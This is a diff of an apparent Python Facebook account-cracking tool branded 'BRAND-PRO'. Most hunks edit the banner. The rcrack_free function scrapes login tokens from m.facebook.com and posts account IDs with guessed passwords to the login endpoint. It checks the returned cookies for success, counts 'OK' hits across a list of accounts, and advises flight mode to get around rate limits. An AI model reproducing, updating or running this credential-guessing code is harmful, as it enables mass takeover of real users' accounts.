@@ -71,7 +71,7 @@ def menu_apikey():
  
   os.system(f" clear")                          
   print(f"""\x1b[1;97m
-  .########..########.....###....##....##.########.
+ .########..########.....###....##....##.########.
  .##.....##.##.....##...##.##...###...##.##.....##
  .##.....##.##.....##..##...##..####..##.##.....##
  .########..########..##.....##.##.##.##.##.....##
@@ -81,8 +81,8 @@ def menu_apikey():
 \033[91;1m--------------------------------------------------
 \033[97;1m>>     Owner    : BRAND-XD
 \033[97;1m>>     Facebook : MEHEDI HASAN TONU
-\033[97;1m>>     Version  : 0.0.2
-\033[97;1m>>     Tools  : BRAND-PRO
+\033[97;1m>>     Version  : \33[1;91m 0.0.2
+\033[97;1m>>     Tools    : BRAND-PRO
 \033[92;1m>>     ToolTyp  : \x1b[91;1m TRIAL 
 \033[91;1m--------------------------------------------------""")
   print(f"\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
@@ -120,7 +120,7 @@ def menu_apikey():
     	menu_apikey()
 #menu_apikey()
 logo=(f"""
-.########..########.....###....##....##.########.
+ .########..########.....###....##....##.########.
  .##.....##.##.....##...##.##...###...##.##.....##
  .##.....##.##.....##..##...##..####..##.##.....##
  .########..########..##.....##.##.##.##.##.....##
@@ -130,8 +130,8 @@ logo=(f"""
 \033[91;1m--------------------------------------------------
 \033[97;1m>>     Owner    : BRAND-XD
 \033[97;1m>>     Facebook : MEHEDI HASAN TONU
-\033[97;1m>>     Version  :  \33[1;91m 0.0.2
-\033[97;1m>>     Tools  : BRAND-PRO
+\033[97;1m>>     Version  : \33[1;91m 0.0.2
+\033[97;1m>>     Tools    : BRAND-PRO
 \033[92;1m>>     ToolTyp  : \x1b[91;1m TRIAL 
 \033[91;1m--------------------------------------------------""")
 def linex():
@@ -218,7 +218,7 @@ def Hasan():
 			clear()
 			total_ids = str(len(fo))
 			print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Total account : \033[1;32m'+total_ids+f' \n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32mMethod > \033[1;37mM{mthd}')
-			print(f" \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Use flight mode for speed up\033[1;37m")
+			print(f" \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32mUse flight mode for speed up\033[1;37m")
 			print(f" \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Working Data+Wifi \033[1;94m")
 			linex()
 			for user in fo:
@@ -688,7 +688,7 @@ def rcrack_free(idf,pwv):
 			sys.stdout.write(f'\r\r\033[1;37m [BRAND-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(useragent)
-			free_fb = session.get('https://free.facebook.com').text
+			free_fb = session.get('https://m.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -700,10 +700,10 @@ def rcrack_free(idf,pwv):
 			"pass":ps,
 			"login":"Log In"}
 			header_freefb = {'authority':'m.facebook.com',
-			'method': 'HOST',
+			'method': 'GET',
 			'scheme': 'https',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
+			'accept-encoding':'gzip, deflate, br',
 			'cache-control': 'max-age=0',
 			'sec-ch-ua': '"Google Chrome";v="100", "Not)A;Brand";v="99", "Chromium";v="100"',
 			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
@@ -713,7 +713,7 @@ def rcrack_free(idf,pwv):
 			'sec-fetch-site': 'none',
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
-			'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'}
+			'user-agent':'Mozilla/5.0 (Linux; Android 11; V2168A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.8.0.0 Mozilla/5.0 (Linux; Android 7.1.1; vivo Xplay6 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/12.2.0.0'}
 			lo = session.post('https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
